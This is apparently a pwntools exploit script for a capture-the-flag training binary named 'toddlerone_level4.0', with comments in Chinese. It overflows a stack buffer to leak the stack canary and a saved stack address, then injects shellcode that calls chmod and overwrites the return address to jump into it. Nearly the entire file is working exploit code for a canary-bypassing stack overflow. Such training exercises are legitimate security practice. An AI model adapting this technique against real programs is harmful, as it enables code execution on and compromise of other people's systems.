from pwn import *
context.arch = "amd64"

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)
# display the bytes
print(disasm(my_sc))
p = process("/challenge/toddlerone_level4.0")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlerone_level2.1", gdbscript='continue')


#获取cookie
mess = p.recvuntil(b"Payload size: ")
print(mess.decode(errors="ignore"))
p.sendline(b"500")
p.recvuntil(b"Send your payload")
s = b"REPEATAA" + b"A"*(0x80+1)
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
cookie = b"\x00" + cont[start + len(s) : start + len(s) + 7]
icookie = int.from_bytes(cookie, "little")
print(hex(icookie))


# 获取栈地址
mess = p.recvuntil(b"Payload size: ")
print(mess.decode(errors="ignore"))
p.sendline(b"500")
p.recvuntil(b"Send your payload")
s = b"REPEATAA" + b"A"*(0x88)
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
rbp_addr =  cont[start + len(s) : start + len(s) + 6]
irbp_addr = int.from_bytes(rbp_addr, "little")
print(hex(irbp_addr))


ret = irbp_addr - 0x250
value = 0x18EBBE203C7D1481
p.recvuntil(b"Payload size: ")
p.sendline(b"500")
p.recvuntil(b"Send your payload")
p.send(my_sc + b"A"*(0x80 - len(my_sc)) + value.to_bytes(8, "little") + cookie + b"AAAAAAAA"+ ret.to_bytes(8,"little"))
all = p.recvall(timeout=1)
print(all.decode(errors="ignore"))
p.close()